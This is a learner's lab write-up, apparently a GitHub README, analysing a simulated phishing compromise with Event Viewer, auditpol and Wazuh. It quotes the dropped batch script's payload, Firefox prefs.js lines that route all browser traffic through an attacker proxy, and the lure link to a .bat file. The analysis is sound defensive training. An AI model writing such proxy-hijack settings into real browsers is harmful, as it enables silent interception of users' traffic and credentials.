# Phishing-to-Compromise-Root-Cause-Analysis
Root cause analysis of a phishing-to-lateral-movement compromise (CompTIA guided lab), using Event Viewer, auditpol, and Wazuh SIEM with MITRE ATT&amp;CK mapping.
# Phishing-to-Compromise Root Cause Analysis (Malicious Script, Audit Policy Tampering, and Wazuh Detection)

`Windows Event Viewer` · `Wazuh SIEM` · `auditpol` · `MITRE ATT&CK` · `Active Directory` · `CompTIA Labs` · `Phishing Analysis`

## Overview
This lab walked through a full mini incident, starting from a phishing email and ending at SIEM-based detection, inside a CompTIA guided lab environment. Rather than treating each piece in isolation, the goal was to connect the dots: a phishing email convinces a user to run a script, that script quietly reroutes browser traffic through an attacker-controlled proxy, the environment's audit policy gets weakened, and a set of suspicious logons shows up using another user's credentials. Wazuh and native Windows Event Viewer logs were used side by side to confirm what actually happened and when.

## Objective
Perform root cause analysis on a simulated compromise by working backward from a phishing lure to the technical artifacts it left behind, evaluate whether the environment's audit configuration was adequate to catch it, and use Wazuh's Security Events module (including its MITRE ATT&CK mapping) to correlate host-level Windows event logs with SIEM-level alerting.

## Environment
- **Victim workstation:** `PC10` (Thunderbird mail client, Firefox browser)
- **Compromised/secondary workstation:** `MS10.ad.structureality.com`
- **Domain controller:** `DC10.ad.structureality.com`
- **SIEM:** Wazuh dashboard at `10.1.16.242` / `10.1.16.242:443`
- **Accounts observed:** `jaime` (phishing target, credentials later reused), `dylan` (account performing the explicit-credential logon and the account whose Downloads folder held the dropped script)
- **Lab platform:** CompTIA Learning Platform, hosted lab environment via LabClient (labondemand.com)

## Tools I Used

| Tool | What It Does | Why I Used It |
|------|--------------|----------------|
| **Thunderbird** | Email client | Opened and inspected the phishing email, including hovering the embedded link to reveal its true destination before ever considering clicking it |
| **Windows Command Prompt** | Native shell | Located the dropped script on disk (`dir /s`) and read its contents safely with `type` instead of executing it |
| **Windows Event Viewer** | Native event log viewer | Reviewed the Security log on both `DC10` and `MS10` for logon events (4624, 4648), audit policy changes (4719), and system time changes (4616) |
| **auditpol** | Audit policy CLI | Ran `auditpol /get /category:*` to check which audit subcategories were actually enabled on the domain controller |
| **Wazuh** | SIEM / log correlation | Reviewed the Security Events dashboard, filtered by date range, and used the built-in MITRE ATT&CK breakdown to see which techniques the alerting was already tagging |

## What I Did

### Finding and Analyzing the Phishing Email
1. Opened Thunderbird on `PC10` (account `jaime@structureality.com`) and found an email titled **"Grab you free juice!"** from `support-team@515support.com`, a domain with no legitimate relationship to the organization.
2. The email claimed "recent equipment changes" required updating internet settings and pushed the recipient toward a **"System Update"** link, explicitly instructing the reader to ignore any warning that the file was unrecognized and to "just agree to allow it to run anyway" - a classic social-engineering line meant to talk the user past their own better judgment.
3. Hovered over the link rather than clicking it and confirmed the actual destination was `http://10.1.24.142/newproxy.bat`, an internal IP address serving a `.bat` file, not anything resembling a real vendor update mechanism.

### Locating and Reading the Dropped Script
1. On the workstation where the payload had already landed, searched the filesystem for it:
```cmd
cd c:\ && dir /s proxyset.bat
```
2. Found `proxyset.bat` sitting in `C:\Users\jaime\Downloads`.
3. Read its contents with `type` instead of running it:
```cmd
type c:\Users\jaime\Downloads\proxyset.bat
```
4. The script navigated into the user's Firefox profile folder and appended proxy settings directly into `prefs.js`:
```
user_pref("network.proxy.http", "10.1.16.2");
user_pref("network.proxy.http_port", 8080);
user_pref("network.proxy.share_proxy_settings", true);
user_pref("network.proxy.socks", "10.1.16.2");
user_pref("network.proxy.socks_port", 8080);
user_pref("network.proxy.ssl", "10.1.16.2");
user_pref("network.proxy.ssl_port", 8080);
user_pref("network.proxy.type", 1);
```
5. This is a textbook browser hijack: every bit of HTTP, SOCKS, and SSL traffic from that browser would now be silently routed through an internal host (`10.1.16.2`) acting as an interception proxy, setting up for credential capture or traffic manipulation without the user noticing anything different on screen.

### Checking the Domain Controller's Audit Policy
1. Ran `auditpol /get /category:*` on `DC10` to see what was actually being logged.
2. Nearly every subcategory returned **"No Auditing"**, including File Share, Privilege Use, Detailed Tracking (Process Creation, RPC Events), Policy Change, Account Management, DS Access, and Account Logon subcategories like Credential Validation and Kerberos ticket operations.
3. This matters a lot in context: a domain controller with this little auditing enabled is flying mostly blind. Most of the meaningful detection in this lab had to come from the handful of logon-related events that were still being generated, rather than from a properly tuned audit policy.

### Finding the Audit Policy Change Itself
1. In Event Viewer's Security log on `DC10`, searched for Event ID 4719 (audit policy change) and found one logged with the message **"System audit policy was changed."**
2. The event's Subject was **jaime**, with the Audit Policy Change details showing Category: Logon/Logoff, Subcategory: Account Lockout, and Changes: **Success removed**.
3. This is a meaningful finding on its own: someone using jaime's account had recently reduced auditing coverage around account lockout logon/logoff events, right around the same window as the other suspicious activity, which either points to intentional evasion or a badly misconfigured GPO being pushed by that account.
4. Cross-checked the same event inside Wazuh by pulling up its raw fields (`data.win.system.eventID: 4719`, `data.win.system.message`), confirming the SIEM had ingested and preserved the exact same details as the native log.

### Investigating the Explicit-Credential Logon
1. Continued through the Security log looking at logons around the same timeframe and found Event ID 4648, **"A logon was attempted using explicit credentials."**
2. The Subject (the account that initiated the action) was `structureality\Dylan`, but the **Account Whose Credentials Were Used** was `jaime`, on domain `structureality`.
3. In plain terms: the `dylan` account was actively using `jaime`'s credentials to authenticate somewhere else on the network. This is exactly the kind of event that shows up during lateral movement or pass-the-hash style activity, one account borrowing another's identity rather than using its own.
4. Used Event Viewer's Find function (`Ctrl+F`) to search by timestamp fragments (e.g. `5:55`) and by username (`jaime`) to walk through the surrounding logon chain (4624 successful logons, 4648 explicit-credential logon, 4634 logoff) in the correct order, rather than trying to eyeball timestamps across a 1,800+ event log.
5. Also located Event ID 4616 (system time changed), triggered by the `LOCAL SERVICE` account via `svchost.exe`. Time changes are worth flagging during an investigation because they can be used to muddy a timeline, though in this case the subject account (a system service account) made it look more like routine NTP-driven drift than deliberate tampering.

### Correlating Everything in Wazuh
1. Opened Wazuh's **Security Events** module and reviewed the dashboard for the relevant date range.
2. In one pass covering March 31 - April 1, the dashboard showed **191 total alerts**, 0 alerts at Level 12 or above, 0 authentication failures, and **60 authentication successes**. The Top MITRE ATT&CK ring chart was dominated by **Valid Accounts**, with smaller slices for **Domain Accounts**, **Pass the Hash**, and **Remote Desktop Protocol**, lining up exactly with the explicit-credential logon found manually in Event Viewer.
3. In a separate 24-hour window, Wazuh's Top MITRE ATT&CK breakdown instead showed **Modify Registry**, **Stored Data Manipulation**, **Data Destruction**, **File Deletion**, **Valid Accounts**, and **Windows Service**, indicating additional post-access activity was also being tagged by the SIEM beyond just the initial credential misuse.
4. Having both data sets side by side reinforced a point that's easy to miss when only looking at raw Windows logs: Wazuh isn't just ingesting events, it's actively classifying them against MITRE ATT&CK techniques, which turns a wall of Event IDs into an actual narrative of attacker behavior.

## What's in This Repo

```
phishing-root-cause-lab/
├── README.md                            # This file
└── screenshots/
    ├── 01-phishing-email-full-body.png
    ├── 02-phishing-link-hover-destination.png
    ├── 03-proxyset-bat-located-on-disk.png
    ├── 04-proxyset-bat-contents.png
    ├── 05-auditpol-no-auditing-output.png
    ├── 06-event-4719-audit-policy-changed.png
    ├── 07-event-4616-system-time-changed.png
    ├── 08-event-4648-explicit-credentials-dylan-as-jaime.png
    ├── 09-event-viewer-find-by-timestamp.png
    ├── 10-wazuh-event-4719-raw-fields.png
    ├── 11-wazuh-mitre-attack-valid-accounts-pth-rdp.png
    └── 12-wazuh-mitre-attack-modify-registry-data-destruction.png
```

## Skills I Picked Up
- **Reading a phishing email like an analyst, not a victim**, hovering links instead of clicking them, and noticing manipulation language ("just agree to allow it to run anyway") as a signal in its own right, not just the payload it points to.
- **Safely inspecting a suspicious script**, using `dir /s` to locate it and `type` to read it in place, rather than ever executing it to "see what it does."
- **Reading a `.bat` proxy hijack for what it actually does**, recognizing that writing `network.proxy.*` values into Firefox's `prefs.js` is a quiet, persistent way to intercept a victim's traffic without any visible change to the browser.
- **Auditing the auditors**, running `auditpol /get /category:*` and recognizing that "No Auditing" across most categories on a domain controller is itself a finding, not just background noise.
- **Correctly reading Event ID 4648**, understanding the distinction between the Subject (who initiated the logon) and Account Whose Credentials Were Used (whose identity was actually presented), which is the whole point of this event ID and easy to misread quickly.
- **Using Event Viewer's Find function purposefully**, searching by both timestamp fragments and usernames to reconstruct a logon chain in order instead of scrolling through thousands of entries.
- **Cross-referencing native logs against SIEM output**, confirming that the same raw event data (down to the exact message text) was present in both Event Viewer and Wazuh, and using Wazuh's MITRE ATT&CK view to translate individual events into named techniques.

## How This Applies in the Real World
This is close to what a real Tier 1/2 SOC investigation looks like end to end: a user report or an alert leads to a phishing email, which leads to a dropped script, which leads to a search through Event Viewer for the logons and policy changes that followed, which then gets validated against whatever the SIEM already flagged. The audit policy finding is arguably the most important part from a defensive standpoint, no amount of SIEM tuning fully compensates for a host that isn't generating the underlying events in the first place, so checking `auditpol` output should be a standard early step whenever detection coverage on a host is in question.

The explicit-credential logon (`dylan` using `jaime`'s credentials) is also a realistic example of why MITRE ATT&CK's "Valid Accounts" technique is one of the most dangerous categories to defend against: nothing about it looks like a traditional "attack," it looks like a normal logon, which is exactly why cross-checking Subject versus Account Whose Credentials Were Used matters so much.

## Where I'm Coming From
I'm making the jump into cybersecurity from a background in **healthcare**. A lot of the instincts carry over directly, working methodically through a timeline, not taking a document (or an email) at face value, and being comfortable saying "I don't know yet, let me check" instead of guessing. I'm currently studying for **CompTIA Security+** and building labs like this one to get hands-on reps with the kind of investigative workflow that doesn't come across on a resume built from a non-technical background.

## What I Want to Learn Next
- Building a proper Wazuh custom rule or decoder for browser proxy tampering, since `prefs.js` modification like this isn't something Wazuh flags out of the box in a default configuration
- Practicing full timeline reconstruction across multiple hosts (not just one Event Viewer instance at a time) using Wazuh's search/query interface instead of manual `Ctrl+F`
- Learning how to properly remediate a weak audit policy like the one found here (which specific subcategories should be enabled first, and why, rather than turning everything on indiscriminately)
- Practicing writing an actual incident summary/report format on top of an investigation like this one, aimed at a non-technical stakeholder audience

## Limitations & What I'd Do Differently in Production
- **This was a guided, pre-built scenario**, not a live investigation. In production I'd need to establish scope and timeline myself rather than being pointed toward the relevant Event IDs.
- **The audit policy gap limited what could actually be reconstructed.** With most subcategories disabled, there's a real chance additional relevant activity (process creation, RPC calls, DS access) happened but was never logged at all. A real assessment would need to flag this as a finding on its own, separate from whatever was found in the logs that did exist.
- **No memory or disk forensics were performed on the source of the phishing script itself** (e.g., confirming whether `10.1.24.142` was internal to the lab's phishing infrastructure or spoofed). This was log- and artifact-based analysis only.
- **Single analyst, single pass.** A real incident response engagement would typically involve a second reviewer validating findings like the 4719 and 4648 events before they're written into a final report.

## References
- [Microsoft: Event ID 4648 - A logon was attempted using explicit credentials](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4648)
- [Microsoft: Event ID 4719 - System audit policy was changed](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4719)
- [MITRE ATT&CK: Valid Accounts (T1078)](https://attack.mitre.org/techniques/T1078/)
- [MITRE ATT&CK: OS Credential Dumping / Pass the Hash (T1550.002)](https://attack.mitre.org/techniques/T1550/002/)
- [Wazuh Documentation](https://documentation.wazuh.com/)
- [CompTIA Security+ (SY0-701) Exam Objectives](https://www.comptia.org/certifications/security)
